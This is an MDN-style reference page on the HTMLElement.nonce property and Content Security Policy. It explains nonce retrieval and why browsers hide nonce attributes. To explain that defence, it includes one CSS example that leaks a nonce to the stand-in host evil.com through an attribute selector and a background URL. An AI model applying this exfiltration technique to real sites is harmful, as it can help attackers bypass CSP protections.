---
title: HTMLElement.nonce
slug: Web/API/HTMLElement/nonce
page-type: web-api-instance-property
tags:
  - API
  - Content Security Policy
  - HTML DOM
  - HTMLElement
  - Property
  - Reference
  - nonce
browser-compat: api.HTMLElement.nonce
---
{{APIRef("HTML DOM")}}

The **`nonce`** property of the {{DOMxRef("HTMLElement")}} interface returns the cryptographic number used once that is used by [Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.

In later implementations, elements only expose their `nonce` attribute to scripts (and not to side-channels like CSS attribute selectors).

## Examples

### Retrieving a nonce value

In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) as a fallback:

```js
let nonce = script['nonce'] || script.getAttribute('nonce');
```

However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`script['nonce']`) will be the only way to access nonces.

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:

```css example-bad
script[nonce~=whatever] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Specifications

{{Specifications}}

## Browser compatibility

{{Compat}}

## See also

- [`nonce` global attribute](/en-US/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/en-US/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
